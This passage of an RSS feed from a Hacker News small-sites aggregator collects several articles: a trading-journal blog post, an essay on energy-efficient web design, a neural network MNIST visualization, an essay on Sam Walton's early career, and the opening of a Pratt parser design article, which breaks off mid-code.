            <guid isPermaLink="false">hacker-news-small-sites-24513528</guid>
            <pubDate>Fri, 18 Sep 2020 06:23:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why you should keep a trading journal, even on a spreadsheet]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24513482">thread link</a>) | @rjbernaldo
<br/>
September 17, 2020 | https://coinfu.io/blog/trading-journal/ | <a href="https://web.archive.org/web/*/https://coinfu.io/blog/trading-journal/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p><img alt="Author: Rj" src="https://coinfu.io/static/home/photo1x1.jpeg"></p><p><span>Rj on August 22, 2020</span></p></div><p>Whether you follow the fundamentals or trade soley on technical analysis, keeping track of one’s trading activity is a necessary exercise that every investor must learn to do.</p><p><img alt="Space" src="https://coinfu.io/static/blog/pexels-jessica-lewis-583846.jpg"><span>Photo by Jessica Lewis from Pexels</span></p><p>This list of trades, more often referred to as a tracker or trading journal, provides you with quantifiable metrics to measure your strategy’s performance so you can tweak and adapt to whatever direction the market decides to move.</p><h2 id="how-do-i-start-a-trading-journal">How do I start a trading journal?</h2><p>There’s quite a few options available to us. Let’s go over some of the ways in which we can keep a trading journal;</p><h3 id="1-third-party-trading-journals">1. Third-party trading journals</h3><p>While this provides an automated way to log your trades, this method doesn’t really offer much in terms of freedom. Your data gets stored in their database and you need to learn how to use their platform as you will be spending a lot of time there.</p><h3 id="2-manual-entry">2. Manual entry</h3><p>This gives you the freedom to store your data anywhere you want. You get to use the tools you are most comfortable with but this requires a lot of work as you need to manually enter each and every trade. Consistency is key in keeping a trading journal and unfortunately this method doesn’t really help with that.</p><h3 id="3-build-your-own">3. Build your own</h3><p>When it comes to security and flexibility, building your own is the best choice. This used to be the most complicated option because you had to either build the integration yourself or hire a developer to do it for you. Well, that’s no longer the case.</p><p>Our platform lets you create tasks that automatically saves your trades in either a spreadsheet or a document. Keep using the tools you love and focus instead on improving your trading strategy.</p><br><h2 id="whats-next">What’s next?</h2><p>This is just an example of what you can accomplish with our platform. coinfu.io supports a large number of services so you can enhance your workflow any way you want.</p><p>Start automating and take your workflows to the next level.</p><p>Thanks for reading,</p><div><p><img alt="Author: Rj" src="https://coinfu.io/static/home/photo1x1.jpeg"></p><p><span>Rj from coinfu.io</span></p></div></div></div></div>]]>
            </description>
            <link>https://coinfu.io/blog/trading-journal/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24513482</guid>
            <pubDate>Fri, 18 Sep 2020 06:14:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How can we, as web professionals, help to make the web more energy efficient?]]>
            </title>
            <description>
<![CDATA[
Score 236 | Comments 384 (<a href="https://news.ycombinator.com/item?id=24513427">thread link</a>) | @giuliomagnifico
<br/>
September 17, 2020 | https://cmhb.de/web-design-and-carbon-impact | <a href="https://web.archive.org/web/*/https://cmhb.de/web-design-and-carbon-impact">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
<section>
    <div><blockquote>
<p>How can we, as web professionals, help to make the web more energy efficient?</p>
</blockquote>
<p>From data centres to transmission networks to the devices that we hold in our hands, it is all consuming electricity, and in turn producing carbon emissions. According to recent estimates, the entire network already consumes 10% of global electricity production, with data traffic doubling roughly every two years. It’s probably something very few people think about, or are even aware of as being an issue. But the fact of the matter is that the Internet consumes a huge amount of electricity. And when it comes to web design, there is a lot that can be done to make the web far more energy efficient.</p>
<hr>
<h2>Attitudes</h2>
<p>Creating a website is a lot more accessible today, made simpler by the emergence of no-code site builders. But it might be asking a lot for your typical web user or amateur creator to be aware of the environmental impact of their site. This, however, shouldn’t really be the case for any digital professional. Naturally, web developers will be more conscious of the weight of their pages, given that they are fully immersed in the code and content management that serves what you see on a web page. But even then, many developers simply look for the quickest route to completing a project, rather than the best way to produce the quickest and most efficient site. </p>
<p>So they load a website with bulky Javascript and third-party tools to meet the visual specification of the client or designer. As long as it works, right? They probably don’t care. They’re probably happy with their site that loads quickly on their 500Mbps connection. Who cares if they’re wasting expensive data on mobile connections in other countries? “But Carl, some of us don’t have the luxury of building super high-performance, lightweight, and optimised sites due to client budgets and deadlines.” Well, I think you need to work on your craft, change your attitude and your priorities, or find another profession.</p>
<p>When we talk about the energy efficiency of websites, it’s easy to assume that it’s a purely technical topic. However, efficiency can be improved before we even build a website. Design and content have a big impact on energy efficiency.</p>
<p>Therefore, some of the biggest contributors to heavy sites and large CO2 emissions, are <em>designers</em>. Large moving imagery, multiple web fonts, animation, sound, autoplaying video, and generally esoteric design is prevalent these days. We see showcase after showcase of the <em>best of the web</em>, where the only criteria is: “Does it look well-designed?” Well, look under the hood. It’s pretty terrifying. And that’s not even getting into the many accessibility concerns. If only more designers would ask themselves, “When was the last time I considered page size when designing something? When was the last time I decided that page weight was more important than aesthetics?” </p>
<p>These are questions I have put to designers before, and the response quite often is, “I’m just experimenting with technologies and trying to improve my UI skills. What harm is there in that?” Well, <em>Site of the Day</em>, the harm is your energy usage, and the likelihood that nobody—besides an echo chamber of fellow designers—give a shit about your over-design. People just want to access content quickly, without distraction, without friction, and without it using a tonne of data. That’s not to say aesthetics aren’t important—they certainly are. The visual design of a site can play a significant role in user experience, readability, and conversion, but as with most things, there is a balance to be achieved. And there is a responsibility to be shared.</p>
<hr>
<h2>Solutions</h2>
<p>Fortunately, there are a growing number of web professionals who do care about the impact sites have on the planet, and there are many solutions designers and developers alike can find to improve their sites without overly compromising their designs. Solutions that I am actively looking into to improve my own work.</p>
<p>So how can we be more energy efficient in web design? Well, the folks over at <a href="https://www.wholegraindigital.com/blog/website-energy-efficiency/">Wholegrain Digital</a> put together a comprehensive list, but here are some key considerations:</p>
<h3>Reduce Images</h3>
<p>The single largest contributors to page weight. The more images, the more data needs to be transferred and the more energy is used. A good starting point is to ask oneself:</p>
<ul>
<li>Does the image genuinely add value to the user?</li>
<li>Does it communicate useful information?</li>
<li>Could the same impact be achieved if the image was smaller?</li>
<li>Could we achieve the same effect with a vector graphic (or even CSS style) instead of a photo?</li>
</ul>
<h3>Optimise Images</h3>
<p>Some designs are focused almost entirely on imagery, in which case optimisation is vital to better performance. There are technical decisions that significantly affect the file size of images displayed on a page. These include:</p>
<ul>
<li>Load images at the correct scale instead of relying on CSS to resize them, so that you avoid loading images that are larger than the scale they will be displayed at.</li>
<li>Use image optimisation tools before you upload them to your site. I personally use <a href="https://imageoptim.com/mac">ImageOptim</a>.</li>
<li>Use the most efficient file format for each image, such as WebP instead of JPEG (although this is not supported by all browsers).</li>
<li>Use image processing tools to resize, crop, and enhance your images that are served. I use <a href="https://www.imgix.com/">imgimx</a> for this, which works well for image-heavy sites such as <a href="https://minimalissimo.com/">Minimalissimo</a>.</li>
</ul>
<h3>Reduce Video</h3>
<p>By far the most data intensive and processing intensive form of content. As with images, ask yourself if videos are really necessary. If they are, never autoplay a video. It creates a much higher load on the users CPU, resulting in vastly greater energy consumption. Plus, it’s annoying as hell. Let the user decide whether or not to play a video.</p>
<h3>Font Selection and Optimisation</h3>
<p>Web fonts can enhance the visual appeal of site designs, as well as improve readability, but they can add significant file weight to the sites on which they are used. A single font file could be as much as 250Kb, and that might only be for the standard weight. If you want bold, add another 250Kb! A couple of options worth considering:</p>
<ul>
<li>Use system fonts where possible.</li>
<li>Use fewer font variations.</li>
<li>Stick to modern web font file formats like WOFF and WOFF2.</li>
<li>Subset fonts to only include the characters needed on the site.</li>
</ul>
<h3>Write Clean Code</h3>
<p>Tidy and streamlined code is a fundamentally good thing. Keep code clean and simple, avoid duplication, and write efficient queries. The code behind the scenes should be a well oiled, lean machine. And I’ll take this opportunity to share a controversial opinion: <em>all designers should learn to code.</em> At least if they want a website. No-code site builders can be very good, but if you’re not aware of the underlying code, then you’ll be less aware of ways to optimise your site.</p>
<h3>Use Less Javascript</h3>
<p>JS impacts website efficiency in two ways: by adding file weight to the web page and by increasing the amount of processing required by the user’s device. The second of these is something that applies to JS much more than to other types of files. Look for ways to achieve front-end interactions, functionality, and animations using more efficient technologies like CSS, or at least use JS efficiently. A particular mention should be given here to tracking and advertising scripts that rarely offer any value to the user, but can add significant file weight. Don’t let advertising get in the way of craftsmanship.</p>
<h3>Use Server Caching</h3>
<p>Using caching technologies such as <a href="https://memcached.org/">Memcached</a> or <a href="https://varnish-cache.org/">Varnish</a> pre-generate static versions of each page so that the server overhead can be significantly reduced for most visitors. This significantly reduces server energy consumption and makes a big difference to page load times. </p>
<h3>SEO</h3>
<p>When optimising a site for search engines, we are helping people find the information they want quickly and easily. When SEO is successful, it results in people spending less time browsing the web looking for information, and visiting fewer pages that don’t meet their needs.</p>
<hr>
<p>No site is perfect, but appreciating that we have a responsibility to produce better digital design for the planet and for users is a good place to start. Web efficiency is an attitude and the result of a mindful approach to building for the web.</p>
<hr>
<h2>Useful Resources</h2>
<ul>
<li><a href="https://www.websitecarbon.com/">Website Carbon</a> (test your site’s carbon footprint)</li>
<li><a href="https://imageoptim.com/mac">ImageOptim</a> (image optimisation tool)</li>
<li><a href="https://www.imgix.com/">imgix</a> (image processing tool)</li>
<li><a href="https://developers.google.com/speed/pagespeed/insights/">Google PageSpeed Insights</a> (test your site’s performance)</li>
<li><a href="https://solar.lowtechmagazine.com/low-tech-solutions.html">Low-tech Solutions</a> (by Low-tech Magazine)</li>
</ul></div>
</section>
    </div></div>]]>
            </description>
            <link>https://cmhb.de/web-design-and-carbon-impact</link>
            <guid isPermaLink="false">hacker-news-small-sites-24513427</guid>
            <pubDate>Fri, 18 Sep 2020 06:02:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Visualizing how a NeuralNetwork learns to recognize the MNIST digits]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24513373">thread link</a>) | @zbendefy
<br/>
September 17, 2020 | https://zbendefy.github.io/neuralnet-web/index.html | <a href="https://web.archive.org/web/*/https://zbendefy.github.io/neuralnet-web/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

    <p>Visualizing a neural network
    </p>

    

    <p>
        Training a Neural network to perform well is not an easy task. The many
        layers of neurons, each having lots of weights and biases often add up
        to several millions of parameters to configure trough learning. Understanding what
        these parameters do by looking at them as raw data is not possible, thus we need somehow visualuze
        what the network does.
        Beside the architecture of the network, we also have to choose and tune a range of training parameters as well, such as activation function,
        regularization parameters and cost function that, to be tuned well, require some rough idea of what 
        the network does.
    </p>

    <picture>
        <source srcset="https://zbendefy.github.io/neuralnet-web/assets/preview.webp" type="image/webp">
        <source srcset="https://zbendefy.github.io/neuralnet-web/assets/preview.gif" type="image/gif">
        <img src="https://zbendefy.github.io/neuralnet-web/assets/preview.webp">
            <p> 
                A neural network learning to recognize digits. Each pixel represents a weight of the network.
            </p>
        
    </picture>

    <p>
        In a conventional algorithm choosing an optimal structure for the data the algorithm operates 
        on can be relatively easily figured out by analyzing the cost of the algorithm and conducting measurements.
        Debugging such an algorithm is also relatively straightforward with many advanced tools available.
        In the case of neural networks however it is often very difficult to understand what a network had eventually
        learned to do during a training, let alone guessing it beforehand. And when a network is not behaving like expected, 
        the familiar debugging tools are not that helpful in figuring out where the issue lies. In some cases however 
        such as image recognition problems we can sort of visualize what the network is trying to learn
        and gain some insight into the learning process. Let's see an example to that.
    </p>
    
    <p>
        The <a href="http://yann.lecun.com/exdb/mnist/">MNIST dataset</a> of hand-written digits is a classic example to introduce machine learning on.
        This dataset contains pictures of hand-written numbers from 0 to 9 and are annotated with the number that is drawn on them.
        The size of the pictures is 28x28 pixels, (in total 784 pixels).
        As such, the data can be used to train a neural network using the pictures as inputs, and the corresponding number as the desired output.
        There are 60,000 training examples and 10,000 test examples in the dataset to train and test on.
    </p>

    <img src="https://zbendefy.github.io/neuralnet-web/assets/MnistExamples.png">
        <p> 
            Some example images from the MNIST dataset
        </p>
    

    <p>
        To try things out, I trained a very simple network using my 
        <a href="https://github.com/zbendefy/machine.academy">neural network library</a> with the following parameters:
    </p>


    <ul>
        <li>Input layer: 784 neurons (one for each pixel of a source image)</li>
        <li>1 Hidden layer: 64 neurons</li>
        <li>Output layer: 10 neurons (1 neuron for each possible output)</li>
        <li>Sigmoid activation is used</li>
        <li>Cross-entropy cost function</li>
        <li>L2 regularization (lambda=1,5)</li>
        <li>Learning rate: 0.01</li>
    </ul>

    <p>
        The network was initialized using the Xavier initialization that provides a good randomized starting point for a network to be trained. 
        The total number of weights and biases is 50,890.
        The training was run for 230 epochs on the 60,000 training examples using 500 sized mini-batches randomized before each epoch.
    </p>

    <img src="https://zbendefy.github.io/neuralnet-web/assets/diagram.svg">
        <p> 
            The structure of the network
        </p>
    

    <p>
        After each epoch the performance of the network was measured against the 10,000 test examples from the dataset.
        The tests were showing promising results very early on. From the initial state, where the network answered 8.92% of the tested
        examples right (a mere random guess would result in a ~10% success rate), after 4 epochs it surpassed the 50% mark. 80% was reached
        in the 17th epoch, and 90% in the 79th epoch. After 230 epochs the training finished at a success rate of ~92.5%.
    </p>
    
    <p>
        Here you can try out the result of the network. Draw a number using your mouse or your touchscreen and press the 'What did I draw?' button!
    </p>

    <div>
        <canvas id="drawCanvasSmall" width="28" height="28"> Your browser does not support the HTML5 canvas tag.</canvas>
        <canvas id="drawCanvas" width="300" height="300"> Your browser does not support the HTML5 canvas tag.</canvas>
        
        <p id="lblResult">Draw a number from 0 to 9!</p>
    </div>

    <p>
        It doesn't really work! Seeing a more than 90% success rate caused high expectations, but after trying some of my own drawings on the network
        it became apparent that the network is failing to recognize hand written digits.
        Around 3 out of 10 of my attempts were successful and that is very far from 90%.
    </p>
    
    <p>
        So what is going on here? To gain a better understanding of why the network fails to recognize our 
        own drawings let's try to visualize the neurons during training in a way that makes sense of the data and
        see if we can find out whats happening!
    </p>
    
    <p>
        On the next video, you can follow trough the learning process epoch by epoch.
        
        In the Hidden layer section you can see the 64 neurons of the Hidden layer in a 8x8 arrangement.
        Each neuron is a 28x28 grid, showing red pixels for positive weights, and blue pixels for negative weights
        as they connect to the Input layer (that is essentially the input image). 
        The bias (or negative threshold) is also visible as a vertical bar on the right side of the weights.
        Yellow is for positive biases and green is for negative ones.
        The Output layer consists of 10 neurons, each having 8x8 weights connecting to each of the neurons in
        the Hidden layer.
    </p>

    <video controls="">
        <!-- <source src="assets/learning.av1.mp4" type="video/mp4; codecs=av01"/> -->
        <source src="https://zbendefy.github.io/neuralnet-web/assets/learning.mp4" type="video/mp4">
        Your browser does not support the video tag.
    </video>
    
    <p>
        As the network is learning you can see some curly patterns emerging from the initial random noise. Those patterns are the common
        parts of numeric digits that the network generalized to. Looking at this image, it seems like each neuron in the Hidden layer is sort of like a function
        in a programming language, meaning that a following layer (in this case the Output layer) can use the Hidden
        layer's neurons as if they were functions implementing some abstracted behavior. By adjusting a weight in one of
        the the Output layer's neurons, it can selectively discard or use the result of the corresponding 'function' in the Hidden layer.
        This is a very powerful way to process things. Imagine having a programming language, where you are not allowed to use any functions:
        you would have to copy-paste a lot of code around meaning that you'd use up a lot more space due to the more instructions.
        Using multiple layers in a network therefore allows us to use way less total neurons to achieve similiar results.
    </p>
    
    <p>
        The patterns that have emerged in the Hidden layer are quite interesting. As we discussed they are probably some
        generalization of hand-drawn numbers, an efficient, compact way of differentiating from one digit to an other.
        Looking at them closely reveals some interesting property though: they seem to be noticably centered inside 
        the 28x28 pixel sized region. Could this mean that the MNIST data was somehow pre-processed? 
        The MNIST dataset's description reveals that in fact this is the case:
    </p>

    <div>
        <p>
            ❞
        </p>
        <p>
            The images were centered in a 28x28 image by computing the center of mass of the pixels, and translating the image so as to position this point at the center of the 28x28 field.
        </p>
    </div>

    <p>
        That's the issue! The previous drawing applet didn't actually take that into consideration, and as the network only ever encountered
        images that were previously centered, it only learned to recognize those.
        The solution now seems simple: Calculate the center of mass for the image that is drawn, and translate the image so that it is in 
        the middle of the 28x28 region.
        This fixes the issue entirely, providing a network that can actually recognize digits. Try out the fixed version here:
    </p>

    <div>
        <canvas id="drawCanvasCorrectedSmall" width="28" height="28"> Your browser does not support the HTML5 canvas tag.</canvas>
        <canvas id="drawCanvasCorrected" width="300" height="300"> Your browser does not support the HTML5 canvas tag.</canvas>
        
        <p id="lblResultCorrected">Draw a number from 0 to 9!</p>
        
    </div>

    <p>
        We could also randomly translate the input images and train the network on that, but that is an unnecessarily harder
        problem for a network to solve. A conventional algorithm is perfectly suitable for this task. 
        Additionally the translation might not be enough, for even better results we should fit the size of the drawing
        to the 28x28 pixel grid.
    </p>
    
    <p>
        One other interesting insight that we can gain from this visualization, is that the 64 neurons of the Hidden layer are
        in fact more than what the network needs. Pause the video at the end of the learning process, and you'll see that out of
        the 64 neurons in the Hidden layer, around 12 of them are noticably dimmer than the rest. It seems like that 
        these neurons have very little impact on the final result, and their values are not that important.
        If you focus on the top-left neuron on the 8x8 grid, you can see that not only it is very dim, but also 
        none the Output layer's 10 neurons reference that top-left neuron with a high enough weight to matter, meaning that it is a 
        mostly redundant. This is a direct hint that we could reduce the neuron count in the Hidden layer to speed up
        learning.
    </p>
    
    

    <p>
        Thanks for reading. If you would like to experiment with this network, you can download it in JSON format by <a href="https://zbendefy.github.io/neuralnet-web/network_000230.json">clicking here</a>.
        Also you can check out my C# Neural Network library called <a href="https://github.com/zbendefy/machine.academy">machine.academy</a>, featuring GPU acceleration.
    </p>
    
    <p>
        The SVG image of the network's structure was made using <a href="http://alexlenail.me/NN-SVG/LeNet.html">this</a> awesome tool available online.
    </p>

    
    
    <a href="https://github.com/zbendefy/neuralnet-web">
        <img src="https://zbendefy.github.io/neuralnet-web/assets/githublogo.png">
        
    </a>








</div>]]>
            </description>
            <link>https://zbendefy.github.io/neuralnet-web/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24513373</guid>
            <pubDate>Fri, 18 Sep 2020 05:50:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ignore every founder’s story on how they started their company]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24513310">thread link</a>) | @trevmckendrick
<br/>
September 17, 2020 | https://www.trevormckendrick.com/essays/why-you-should-ignore-every-founders-story-about-how-they-started-their-company | <a href="https://web.archive.org/web/*/https://www.trevormckendrick.com/essays/why-you-should-ignore-every-founders-story-about-how-they-started-their-company">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h3>Founding Stories Are Myths</h3><p>Company founding stories are almost always non-malicious lies. Take the image above of Reed Hastings @ Netflix....</p><p>Reed Hastings has <a href="https://www.vanityfair.com/news/2013/02/07-reed-hastings">said</a> <a href="http://archive.fortune.com/2009/01/27/news/newsmakers/hastings_netflix.fortune/index.html">many</a> <a href="https://twitter.com/netflix/status/2746816142?lang=en">times</a> <a href="https://www.wired.com/2002/12/netflix-6/">that</a> <a href="http://www.evancarmichael.com/library/reed-hastings/Reed-Hastings-Quotes.html">he got the</a> <a href="https://www.hollywoodreporter.com/news/reed-hastings-innovator-year-81514">idea</a> for Netflix because he once was charged a $40 late fee on Apollo 13.</p><p>That didn’t actually happen. </p><p>It’s unfortunate because it will inevitably mislead anyone learning how to start a company. </p><h3>Sam Walton's Overnight Success</h3><figure><p><img src="https://uploads-ssl.webflow.com/5f139e18c71662d40ea9d4c9/5f139e70c3fecf07561da8e7_grand_opening.jpeg" alt=""></p></figure><p>Sam was already 44(!) when he opened the first Walmart and had been running his own retail stores for over 15 years.</p><p>He wondered why people focused on the beginning of Walmart: </p><p><strong>Somehow over the years folks have gotten the impression that Walmart was something I dreamed up out of the blue as a middle-aged man, and that it was just this great idea that turned into an overnight success… </strong></p><p><strong>Like most overnight successes, it was about 20 years in the making.</strong></p><p>If you’re trying to build your own thing &amp; you want to learn from “the founder of Walmart”, looking at the start of the company itself is stupid because at that point he already had 15 years of experience</p><p>So let’s start with Sam’s very first store.</p><h3>The Biggest Mistake of&nbsp;Sam's Professional Life</h3><p>Sam started his retail career at 27 buying his 1st store, a “Ben Franklin” variety store franchise. </p><p>As a beginner he relied on the franchise’s playbook but also incorporated his own experiments. </p><p>Things like:</p><ul role="list"><li>putting popcorn &amp; ice cream machines in front of the store to drive traffic</li><li>doing huge discounts but actually making it up in volume (i.e. not ironically)</li><li>buying directly from manufactures instead of going through the franchise (which allowed for cheaper prices)</li></ul><p>He worked hard on that single store for 5 years, grew sales 3.5x to $250k/year and became the #1 Ben Franklin franchisee in his six-state region.</p><p>But then he found out he’d made a gigantic mistake.</p><p><strong><em>When he signed the store lease he didn’t include an option to renew it.</em></strong></p><p>The owner (a local department store competitor) saw his success &amp; refused to renew the lease at any price, thereby forcing Sam to shut down the store.</p><p>Imagine working on something for 5 years straight, becoming the best at it, and then having a single person end it all.</p><p>Sam was devastated:</p><p><strong><em>It was the lowpoint of my business life. I felt sick to my stomach. I couldn’t believe it was happening to me… I had built the best variety store in the whole region and worked hard in the community – done everything right – and now I was being kicked out of town. It didn’t seem fair. I blamed myself for ever getting suckered into such an awful lease, and I was furious at the landlord.</em></strong></p><p>He was mad, but he accepted responsibility:</p><p><strong><em>I’ve always thought of problems as challenges, and this one wasn’t any different… I had to pick myself up and get on with it, do it all over again, only even better this time.</em></strong></p><p>If Facebook or Google change their algorithms you at least get to keep your old customer base and your business assets.</p><p>But with a retail store you have none of that. </p><p>And because of the structure of the town they couldn’t just open another store somewhere nearby.</p><p>The Waltons literally had to pack up their family of 6 and go find a new town.</p><figure><p><img src="https://uploads-ssl.webflow.com/5f139e18c71662d40ea9d4c9/5f139e7090bddf371b5d9227_shadow_figures.jpeg" alt=""></p></figure><p>If he’d wanted to Sam had plenty of reasons to sulk: they were starting all over in a <em>smaller</em> town (Bentonville) that also had its fair share of competition (3 other variety stores). </p><p><strong>But Sam said “it didn’t matter much because I had big plans.”</strong></p><h3>Unsexy Determination</h3><p>Sam spent the next 12 years in what I call <em>narrative limbo</em>.</p><p>It’s the crucial part of any “overnight success” that doesn’t get covered in the Successful Entrepreneur genre.</p><p>No one writes about all the random tangents and mistakes you make here.</p><p>Like, say, that time Sam tried to start a shopping mall 10 years too early and lost $25,000? </p><p>Or what about the time a tornado destroyed his best performing store? All he had to say was “we just rebuilt it and got back at it.”</p><p>This is important to know if you’re trying to learn from Sam, but it doesn’t fit into any narrative.</p><p>The lesson here is that there will be mistakes and problems on any path to success. As a recent book title says, <a href="https://www.amazon.com/dp/B00G3L1B8K/ref=dp-kindle-redirect?_encoding=UTF8&amp;btkr=1">those obstacles are the way itself.</a></p><p>A coworker said Sam excelled here because he woke up every day “determined to improve something”, and that he was</p><p><strong><em>less afraid of being wrong than anyone I’ve ever known…Once he sees he’s wrong, he just shakes it off and heads in another direction.</em></strong></p><p>You don’t get any of this from Reed Hastings when he talks about $40 late fees. You think “oh I need a great idea” when the reality is the idea is nothing and your psychology &amp; persistence is everything.</p><p>Eventually Sam got to 15 stores &amp; by 1960 was the largest independent variety store operator in the US, doing a a total of ~$12M (in 2018 dollars) in annual revenue.</p><h3>It Would Seem Obvious</h3><p>It was here that Sam finally saw the opportunity for much bigger discount stores and got to work on the 1st Walmart.</p><p>He was the most successful independent operator in the US &amp; had 15 years of experience in retail, surely it should have been easy for him to raise money from investors…?</p><p>Wrong.</p><p>Sam asked other store owners, entrepreneurs, competitors… basically everyone said no.</p><p>He got a measly 5% from his own brother &amp; a store manager and had to borrow the other 95% (signing their house and all their other stores as collateral).</p><p><strong><em>Even the great Sam Walton couldn’t find investors to start the 1st Walmart, on the back of a near-perfect record in retail.</em></strong></p><h3>The 1st Wal-Mart</h3><p>Finally, the point where most people look at to learn, is the end of our story.</p><p>The 1st Walmart was an ugly retail store (8-foot ceilings, concrete floor, wooden fixtures) but it worked because Walmart’s prices always beat competitors. </p><p>(Even the name “Walmart” was selected with customer prices in mind: it was cheaper to buy neon signs for 7 letters than the longer names Sam considered.)</p><p>And you think Sam cared 2 cents about what anyone else thought about his stores? </p><p>The New York Times doesn’t mention Sam or Walmart until 1969, 7 years after the 1st store opening, and he’s just one random quote in the back of the paper:</p><figure><p><img src="https://uploads-ssl.webflow.com/5f139e18c71662d40ea9d4c9/5f139e7098a06f34c1f02247_south.png" alt=""></p></figure><p>And the Walmart 1970 IPO got a <em>single</em> mention on page 44 of the Times:</p><figure><p><img src="https://uploads-ssl.webflow.com/5f139e18c71662d40ea9d4c9/5f139e7072644e0be8fffc12_nyt_walton.png" alt=""></p></figure><p>If you want to learn from entrepreneurs, look at the start not the finish.</p><p>This first appeared in my weekly newsletter <em>How It Actually Works</em>. <a href="https://www.howitactuallyworks.com/">Sign up to receive it here.</a></p></div></div>]]>
            </description>
            <link>https://www.trevormckendrick.com/essays/why-you-should-ignore-every-founders-story-about-how-they-started-their-company</link>
            <guid isPermaLink="false">hacker-news-small-sites-24513310</guid>
            <pubDate>Fri, 18 Sep 2020 05:32:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Making a Pratt Parser Generator]]>
            </title>
            <description>
<![CDATA[
Score 59 | Comments 12 (<a href="https://news.ycombinator.com/item?id=24513092">thread link</a>) | @todsacerdoti
<br/>
September 17, 2020 | https://www.robertjacobson.dev/designing-a-pratt-parser-generator | <a href="https://web.archive.org/web/*/https://www.robertjacobson.dev/designing-a-pratt-parser-generator">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main" role="main">
    <div>

        <article>

            

            
            <figure>
            </figure>
            

            <section>
                <div>
                    <h2 id="a-brief-history-of-the-pratt-parsing-algorithm">A brief history of the Pratt parsing algorithm</h2>
<p>The history of programming language parsers is dominated by the thorny challenge of parsing expressions, mathematical expressions in particular, taking into account the pecedence of operators in the expressions. Modern formal language theory began with the work of Noam Chomsky in the 1950s, in which Chomsky lays out a mathematical framework for linguistics. Under this mathematical framework, languages exist within a heirarchy of langauges defined according to how difficult the language is to parse.<sup id="fnref:1"><a href="#fn:1">1</a></sup> But computer programmers needed practical, efficient algorithms to parse computer programs for translation to machine code. Parsers of the 1950s relied on ad hoc logic rather than systematic algorithms (a feature which persists to this day, though to a much lesser degree). The 1960s was a golden age of parsing algorithm research when nearly all of the concepts and algorithms we use today were discovered and rigorously studied. By the early 1970s, parsing theory had evolved to the point that  Stephen C. Johnson, a computer scientist at Bell Labs / AT&amp;T, was able to start work on YACC (now “Yacc”), “Yet Another Compiler Compiler.”<sup id="fnref:2"><a href="#fn:2">2</a></sup> YACC was first publically described in 1975 and shipped with Unix version 3<sup id="fnref:3"><a href="#fn:3">3</a></sup>  and is still in use today.</p>

<p>The thorny challenge of parsing expressions was partially solved in 1961 by the venerable shunting-yard algorithm described by Dutch computer scientist Edsger W. Dijkstra, which algorithm could efficiently parse binary infix operator expressions with a value stack and an operator stack, creating nodes from the bottom up. Vaughan R. Pratt generalized Dijkstra’s sunting-yard algorithm to parsing of entire languages, this time using a single stack, or using recursive descent with the call stack as an implicit stack, creating nodes from the top down. Pratt’s parsing algorithm overcomes a number of limitations with the shunting-yard algorithm and is simpler.</p>

<p>Precedence climbing was apparently first invented by Martin Richards in 1979<sup id="fnref:4"><a href="#fn:4">4</a></sup> for his BCPL compiler. Precedence climbing uses a single recursive function and a single table mapping token IDs to their precedence instead of Pratt’s mutual recursive descent and multiple tables. In fact, precedence climbing can be seen as a special case of Pratt parsing, though historically they have been understood as related but not identical.<sup id="fnref:5"><a href="#fn:5">5</a></sup><sup>,</sup><sup id="fnref:6"><a href="#fn:6">6</a></sup></p>

<p>Vaughan Pratt had described his algorithm six years earlier in 1973 at the very first meeting of POPL, the Symposium on Principles of Programming Languages, which remains among the most important conferences in the field. It is interesting to see what other papers are published in the 1973 POPL Proceedings. One finds, for example, Aho, S. C. Johnson, and J. D. Ullman’s “Deterministic parsing of ambiguous grammars,“<sup id="fnref:8"><a href="#fn:8">7</a></sup> and James H. Morris, Jr.’s “Types are not sets,”<sup id="fnref:9"><a href="#fn:9">8</a></sup> among papers by several other influential luminaries. Vaughan Pratt had been developing an alternative expression syntax for MACLISP called CGOL,<sup id="fnref:10"><a href="#fn:10">9</a></sup> which he needed to parse.</p>

<h2 id="parser-design">Parser design</h2>

<h3 id="the-typical-design">The typical design</h3>

<p>There are already many articles on the web describing the Pratt parsing algorithm. (I recommend <sup id="fnref:5:1"><a href="#fn:5">5</a></sup>.) If you are not familiar with the algorithm, go read up on it before returning here.</p>

<p>A typical object oriented design is to have a node class for each kind of AST node, each class implementing their own “parselet” method, traditionally named <code>led</code>  for “left donation” after Pratt’s original article, that is called by a driver algorithm and is responsible for parsing the node instance’s operands (children) by calling back into the driver before returning. Each class also keeps track of its associativity and precedence. The driver algorithm consumes a token, looks up the appropriate class in a table, creates an instance and calls its parslet method.</p>

<p>We can be a little bit more efficient by having only a handful of superclasses corresponding to each required (affix, associativity) combination. In the typical object-oriented Pratt-parser design, every operator would need a subclass of the form</p>

<div><div><pre><code><span>class</span> <span>Multiply</span><span>:</span> <span>public</span> <span>InfixLeftAssoc</span><span>{</span>
  <span>Multiply</span><span>(</span><span>Parser</span> <span>parser</span><span>,</span> <span>ASTNode</span> <span>left</span><span>,</span> <span>Token</span> <span>operator</span><span>)</span><span>:</span> 
  	<span>precedence</span><span>(</span><span>40</span><span>){</span>
		<span>super</span><span>(</span><span>parser</span><span>,</span> <span>left</span><span>,</span> <span>operator</span><span>);</span>
  <span>}</span>
  
  <span>T</span> <span>MultiplyMethodA</span><span>(</span><span>U</span> <span>param1</span><span>,</span> <span>V</span> <span>param2</span><span>){...}</span>
  <span>W</span> <span>MultiplyMethodB</span><span>(</span><span>X</span> <span>param1</span><span>,</span> <span>Y</span> <span>param2</span><span>){...}</span>
